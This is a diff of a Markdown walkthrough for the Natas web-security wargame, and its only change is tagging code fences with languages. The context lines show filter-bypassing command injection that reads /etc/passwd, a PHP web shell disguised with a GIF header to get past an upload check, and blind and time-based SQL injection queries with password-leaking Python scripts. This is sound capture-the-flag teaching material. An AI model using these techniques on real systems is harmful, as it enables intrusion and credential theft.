@@ -33,7 +33,7 @@ This write up will show the necessary steps to get password.
 
 They say they are now filtering characters, let's examine the source code to see what is now blocked.
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -80,7 +80,7 @@ if($key != "") {
 
 Notice the `preg_match` function, now it's looking for `;`, `|`, and `&` characters. If those character are present in the query, it will not execute the command. I staucked at this for a while, then I realized maybe I can `grep` one pattern from multiple files. So I tried `a /etc/passwd`, which will make the query:
 
-```
+```bash
 grep -i a /etc/passwd dictionary.txt
 ```
 
@@ -96,7 +96,7 @@ Now, let's do the same for the password file. If 'a' does not return anything, t
 
 Source
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -212,7 +212,7 @@ Change the cookie to this, and the password will be shown.
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -285,7 +285,7 @@ The code is a lot, but essentially it's just a file upload service. It takes a f
 
 The problem in this code is, we can change the file extension. Bacause the extension is written in HTML, though the type is hidden, we can still change that. Let's write a simple PHP webshell.
 
-```
+```php
 <?php
 system($_REQUEST[c']);
 ?>
@@ -307,7 +307,7 @@ That's cool, now we have code execution we can do many things. But for the sake 
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -389,7 +389,7 @@ Choose a JPEG to upload (max 1KB):<br/>
 
 The code looks similar except the part it checks the file type…duh. Here is how it's checking file type:
 
-```
+```php
 exif_imagetype($_FILES['uploadedfile']['tmp_name'])
 ```
 
@@ -399,7 +399,7 @@ All this function does is to check file's signature. Which means any image file 
 
 For image files, GIF file's magic header is the easiest to reproduce as it's all plain text: `GIF89a;`. Let's add this before our PHP webshell from last level.
 
-```
+```php
 GIF89a;
 <?php
 system($_REQUEST[c']);
@@ -422,7 +422,7 @@ Ah ha! Sql injection!
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -479,7 +479,7 @@ And here we go. The source code does not filter anything, so by injecting a doub
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -543,7 +543,7 @@ With the info above, we can construct a blind injection query to slowly leak the
 
 Here is a simple query:
 
-```
+```sql
 SELECT * FROM natas15 WHERE username="natas16" AND password LIKE BINARY "a%"-- -"
 ```
 
@@ -551,7 +551,7 @@ The `BINARY` clause in MySQL will specify query to be case-sensitive. And the `"
 
 By running the script I build, I can slowly leak the password.
 
-```
+```python
 import requests
 import string
 import sys
@@ -585,7 +585,7 @@ sys.stdin.write(f'\nFound password: {known_pass}\n')
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -634,7 +634,7 @@ That's a lot of filters, and they even added a quotation mark around the `key` v
 
 We can use the `grep` command in this case, since the password is definitely not in the dictionary, so if we just do `cat password_file`, then it should return nothing as it cannot find a match, other wise it will grep an empty string which is definitely in the dictionary. `grep` also supports regular expression. So here is the sample command:
 
-```
+```bash
 $(grep -E ^a /etc/natas_webpass/natas17)
 ```
 
@@ -646,7 +646,7 @@ An example command:
 
 Like the blind injection last level, let's do the same thing but for bash.
 
-```
+```python
 import requests
 import sys
 import string
@@ -683,7 +683,7 @@ More injections because why not.
 
 Source:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -747,7 +747,7 @@ In SQL, not just MySQL, there is some sort of `sleep` functions, we will use thi
 
 For starters, let's try this:
 
-```
+```sql
 SELECT * FROM natas17 WHERE username="" OR (SELECT 1=1 AND sleep(1))-- -
 ```
 
@@ -755,13 +755,13 @@ The first half will fail, so it will return the value of second half, which `1=1
 
 Then our query should look like this:
 
-```
+```sql
 SELECT * FROM natas17 WHERE username="natas18" AND password LIKE BINARY "s%" AND SLEEP(1)-- -
 ```
 
 For the exploit script, we will have to time the query this time. Because upon a successful query, it will sleep for 1 second. Just to make sure nothing goes wrong, let's do 3 seconds.
 
-```
+```python
 import requests
 import sys
 import time
